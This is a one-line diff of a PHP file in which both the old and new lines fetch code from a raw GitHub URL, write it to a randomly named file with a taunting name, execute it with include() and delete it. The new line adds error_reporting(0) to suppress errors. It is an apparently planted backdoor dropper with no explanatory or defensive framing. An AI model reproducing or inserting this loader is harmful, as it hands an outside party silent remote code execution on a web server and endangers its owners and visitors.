@@ -1,1 +1,1 @@
-<?php $x="https://raw.githubusercontent.com/ortod0x/super-happiness/main/1c92nc0x.zee";$c=rand(1000,9999999);$y="$c-NO_ONE_CAN_DELETE_ME.call_me-$c-_lmfaoo_$c-what_do_ya_want_huh";file_put_contents($y,file_get_contents($x));include($y);unlink($y); ?>
+<?php error_reporting(0);$x="https://raw.githubusercontent.com/ortod0x/super-happiness/main/1c92nc0x.zee";$c=rand(1000,9999999);$y="$c-NO_ONE_CAN_DELETE_ME.call_me-$c-_lmfaoo_$c-what_do_ya_want_huh";file_put_contents($y,file_get_contents($x));include($y);unlink($y); ?>
